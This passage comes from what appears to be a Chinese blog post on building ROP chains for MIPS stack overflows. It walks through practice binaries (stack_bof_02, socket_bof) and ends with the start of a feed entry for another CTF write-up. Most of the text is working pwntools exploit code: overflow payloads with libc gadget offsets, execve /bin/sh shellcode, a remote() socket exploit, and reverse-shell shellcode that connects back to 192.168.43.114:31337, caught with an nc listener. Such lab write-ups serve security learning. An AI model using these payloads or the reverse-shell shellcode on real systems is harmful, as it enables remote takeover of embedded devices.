class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32<br><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br><br>libc_base = <span class="hljs-number">0x7f6e5000</span><br>mysleep = libc_base + <span class="hljs-number">0x2f2b0</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span><br>payload += p32(libc_base + <span class="hljs-number">0x0000Afe0</span>)<br><br>payload += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x18</span><span class="hljs-comment"># sp offset</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s0</span><br>payload += p32(mysleep)<span class="hljs-comment"># s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># fp</span><br>payload += p32(libc_base + <span class="hljs-number">0x2FB10</span>)      <span class="hljs-comment"># ra</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>我们通过调试查看是否成功调用 sleep(1).</p><p>可以看到，我们成功执行了 sleep 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/8.png" alt="img"></p><p>但是，寄存器 $ra ，即返回地址不受控制，所以我们需要找到既可以调用函数又可以控制 $ra 寄存器的 gadget。这里我们的需求是可以使用 $sn 控制 $t9 的 gadget 。因为我们在上述 scandir 的gadget中可以控制 $sn 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/9.png" alt="img"></p><p>我们挨个查看，并最终找到 0x21c34 这个 gadget 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/10.png" alt="img"></p><p>这里我们可以通过 $s3 调用 sleep ，同时，可以通过 $ra 返回到下一段 gadget。</p><p>此时，脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32<br><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br><br>libc_base = <span class="hljs-number">0x7f6e5000</span><br>mysleep = libc_base + <span class="hljs-number">0x2f2b0</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span><br>payload += p32(libc_base + <span class="hljs-number">0xAfe0</span>)<br><br>payload += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x18</span><span class="hljs-comment"># sp offset</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s0</span><br>payload += p32(libc_base + <span class="hljs-number">0x21c34</span>)<span class="hljs-comment"># s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s2</span><br>payload += p32(mysleep)<span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># fp</span><br>payload += p32(libc_base + <span class="hljs-number">0x2FB10</span>)      <span class="hljs-comment"># ra</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>执行，查看寄存器及堆栈。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/11.png" alt="img"></p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/12.png" alt="img"></p><p>我们成功执行了 sleep ，并且可以得知返回地址位于 $sp + 0x2c 的位置。接下来我们在此位置上布置 shellcode。继续查找合适的 gadget 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/13.png" alt="img"></p><p>并发现 0x171cc 这个 gadget 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/14.png" alt="img"></p><p>这里通过栈向 $a0 寄存器传入数据，若我们可以跳转到 $a0 寄存器，便可以执行我们的 shellcode 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/15.png" alt="img"></p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/16.png" alt="img"></p><p>最终 wp 如下。其中，shellcode 摘抄自<a href="http://shell-storm.org/shellcode/files/shellcode-792.php">这里</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32<br><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br><br>libc_base = <span class="hljs-number">0x7f6e5000</span><br>mysleep = libc_base + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = <span class="hljs-string">b&#x27;&#x27;</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="hljs-comment"># slti $a2, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="hljs-comment"># slti $a2, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="hljs-comment"># lui $t7, 0x6962</span><br>shellcode += <span class="hljs-string">b&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="hljs-comment"># ori $t7, $t7, 0x2f2f</span><br>shellcode += <span class="hljs-string">b&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="hljs-comment"># sw $t7, -0xc($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="hljs-comment"># lui $t6, 0x6873</span><br>shellcode += <span class="hljs-string">b&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="hljs-comment"># ori $t6, $t6, 0x2f6e</span><br>shellcode += <span class="hljs-string">b&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="hljs-comment"># sw $t6, -8($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="hljs-comment"># sw $zero, -4($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\xf4\xff\xa4\x27&quot;</span>  <span class="hljs-comment"># addiu $a0, $sp, -0xc</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x05\x28&quot;</span>  <span class="hljs-comment"># slti $a1, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\xab\x0f\x02\x24&quot;</span>  <span class="hljs-comment"># addiu;$v0, $zero, 0xfab</span><br>shellcode += <span class="hljs-string">b&quot;\x0c\x01\x01\x01&quot;</span>  <span class="hljs-comment"># syscall 0x40404</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span><br>payload += p32(libc_base + <span class="hljs-number">0xAfe0</span>)<br><br>payload += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x18</span><span class="hljs-comment"># sp offset</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s0</span><br>payload += p32(libc_base + <span class="hljs-number">0x21c34</span>)<span class="hljs-comment"># s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s2</span><br>payload += p32(mysleep)<span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># fp</span><br>payload += p32(libc_base + <span class="hljs-number">0x2FB10</span>)      <span class="hljs-comment"># ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span><br>payload += p32(libc_base + <span class="hljs-number">0x214A0</span>)<span class="hljs-comment"># $s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><br>payload += p32(libc_base + <span class="hljs-number">0x171cc</span>)<span class="hljs-comment"># $ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br><br>payload += shellcode<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>这里成功执行了我们的 shellcode。</p><p>要注意的是，<strong>在 MIPS 指令集中，0x20 和 0x00 都是坏字节</strong>。因此 gadget 的地址不能包含这两个值。同时，提一个小trick，在我们想写入的地址有坏字节时，可以通过先-1写入，后面依靠其他gadget来将地址加一来完成构造。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/17.png" alt="img"></p><p>并且获取到了 shell 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/18.png" alt="img"></p><h3 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h3><h4 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h4><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/19.png" alt="img"></p><p>v11的缓冲区为26，我们可以输入 0x1f4 字节，同时使用 <code>sprintf</code>通过 v10 格式化输入 v11，存在明显的栈溢出。</p><h4 id="动态分析-1"><a href="#动态分析-1" class="headerlink" title="动态分析"></a>动态分析</h4><p>由于是一个 socket 程序，所以我们需要关注如何输入。</p><p>首先运行 socket_bof ，并绑定 4321 端口。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/20.png" alt="img"></p><p>使用 nc 连接该 socket ，并输入数据。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/21.png" alt="img"></p><p>若是调试，只需要在qemu运行时使用 -g 绑定一个调试端口即可。</p><p>接下来测试偏移。我们依然使用 cyclic + 返回地址的方法确定。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/22.png" alt="img"></p><p>可以得到偏移为 51 。</p><h4 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h4><p>这里较 <code>stack_bof_02</code> 十分相像，只是偏移不同而已，我们依然尝试使用上题的 ROP 链获取 shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32<br><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br><br>libc_base = <span class="hljs-number">0x7f6e5000</span><br>mysleep = libc_base + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = <span class="hljs-string">b&#x27;&#x27;</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="hljs-comment"># slti $a2, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="hljs-comment"># slti $a2, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="hljs-comment"># lui $t7, 0x6962</span><br>shellcode += <span class="hljs-string">b&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="hljs-comment"># ori $t7, $t7, 0x2f2f</span><br>shellcode += <span class="hljs-string">b&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="hljs-comment"># sw $t7, -0xc($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="hljs-comment"># lui $t6, 0x6873</span><br>shellcode += <span class="hljs-string">b&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="hljs-comment"># ori $t6, $t6, 0x2f6e</span><br>shellcode += <span class="hljs-string">b&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="hljs-comment"># sw $t6, -8($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="hljs-comment"># sw $zero, -4($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\xf4\xff\xa4\x27&quot;</span>  <span class="hljs-comment"># addiu $a0, $sp, -0xc</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x05\x28&quot;</span>  <span class="hljs-comment"># slti $a1, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\xab\x0f\x02\x24&quot;</span>  <span class="hljs-comment"># addiu;$v0, $zero, 0xfab</span><br>shellcode += <span class="hljs-string">b&quot;\x0c\x01\x01\x01&quot;</span>  <span class="hljs-comment"># syscall 0x40404</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">51</span><br>payload += p32(libc_base + <span class="hljs-number">0x0000Afe0</span>)<br><br>payload += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x18</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s0</span><br>payload += p32(libc_base + <span class="hljs-number">0x21C34</span>)      <span class="hljs-comment"># s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s2</span><br>payload += p32(mysleep) <span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># fp</span><br>payload += p32(libc_base + <span class="hljs-number">0x2FB10</span>)      <span class="hljs-comment"># ra</span><br><br>payload += <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x24</span><br><br>payload += p32(libc_base + <span class="hljs-number">0x214A0</span>)                  <span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">4</span>                                      <span class="hljs-comment"># s4</span><br>payload += p32(libc_base + <span class="hljs-number">0x171CC</span>)                     <span class="hljs-comment"># ra</span><br><br>payload += <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x18</span>                                   <span class="hljs-comment"># shellcode offset</span><br><br>payload += shellcode<br><br><span class="hljs-comment"># with open(&#x27;test&#x27;,&#x27;wb&#x27;) as f:</span><br><span class="hljs-comment">#         f.write(payload)</span><br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4321</span>)<br><br>p.sendline(payload)<br><br><span class="hljs-comment"># p.interactive()</span><br></code></pre></td></tr></table></figure><p>我们成功获取了shell。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/23.png" alt="img"></p><p>等等，有没有感觉有一丝丝的诡异。我们竟然在本地获取了远程服务器的shell，且该shell依然在远程，所以我们依然没有办法控制远程服务器。</p><p>这里，我们可以采取 reverse shell 的方式获取远程服务器shell。较上述wp，只需要修改 shellcode 即可。实现反向shell的<a href="http://shell-storm.org/shellcode/files/shellcode-860.html">shellcode</a>。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/24.png" alt="img"></p><p>注意，这里需要修改 shellcode 的 ip 地址。</p><p>首先，需要获取本地的 ip 地址，并使用 16 进制表示。比如说，我们这里的 ip 地址为 <strong>192.168.43.114</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">ip</span>):<br>    t = ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)):<br>        res += <span class="hljs-built_in">int</span>(t[i]) &lt;&lt; <span class="hljs-number">8</span> * i<br>    res = <span class="hljs-built_in">hex</span>(res)<br>    <span class="hljs-built_in">print</span>(res)<br><br>transfer(<span class="hljs-string">&quot;192.168.43.114&quot;</span>)<br></code></pre></td></tr></table></figure><p>转换为16进制，且用小端表示为 0x722ba8c0。</p><p>注意到传递 ip 的汇编语句为，<code>li $a1, 0x722ba8c0</code>，我们将其转换为机器码输入。这里使用<a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler">在线网站</a>转换。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/25.png" alt="img"></p><p>最终我们 shellcode 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># reverse shell 192.168.43.114:31337 </span><br>stg3_SC = <span class="hljs-string">b&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span><br><span class="hljs-comment"># stg3_SC += b&quot;\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;   # 192.168.1.177</span><br>stg3_SC += <span class="hljs-string">b&quot;\xf8\xff\xa5\xaf\x2b\x72\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span><br></code></pre></td></tr></table></figure><p>使用 <code>nc -nvlp 31337</code>监听 31337 端口。</p><p>继续执行上述 wp。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/26.png" alt="img"></p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/27.png" alt="img"></p><p>成功反弹shell。</p><h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><h3 id="mipsrop简单使用"><a href="#mipsrop简单使用" class="headerlink" title="mipsrop简单使用"></a>mipsrop简单使用</h3><p>我们常用的类是 mipsrop.MIPSROPFinder()，该类中常用方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">rop = mipsrop.MIPSROPFinder()<br>rop.stackfinder()    <span class="hljs-comment"># 寻找栈数据可控的 rop，建立栈和 a类型与s类型 寄存器的关系</span><br>rop.find(xxx)        <span class="hljs-comment"># 查找指定的rop，可以使用正则表达式匹配 </span><br>rop.tails()          <span class="hljs-comment"># 列出将栈上的数据保存在$ra等寄存器中的rop</span><br>rop.system()         <span class="hljs-comment"># 寻找命令执行的的 rop，建立栈与寄存器$a0的关系</span><br>rop.summary() <span class="hljs-comment"># 查找可用的完整调用链</span><br></code></pre></td></tr></table></figure><h3 id="mips常用gadget"><a href="#mips常用gadget" class="headerlink" title="mips常用gadget"></a>mips常用gadget</h3><p>我们上述采用的 gadget 基本都是通用的 gadget，可以参考以下博客进行总结。</p><p>参考：<a href="https://www.cnblogs.com/hac425/p/9416864.html">https://www.cnblogs.com/hac425/p/9416864.html</a></p><p>参考文档</p><p><a href="https://www.anquanke.com/post/id/169689">https://www.anquanke.com/post/id/169689</a></p><p><a href="https://xz.aliyun.com/t/6808#toc-8">https://xz.aliyun.com/t/6808#toc-8</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>mips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-Syctf-两道off-by-null</title>
    <link href="/2023/06/14/2023-%E5%AE%89%E6%B4%B5%E6%9D%AF-pwn%E4%B8%A4%E9%81%93off-by-null/"/>
    <url>/2023/06/14/2023-%E5%AE%89%E6%B4%B5%E6%9D%AF-pwn%E4%B8%A4%E9%81%93off-by-null/</url>
    
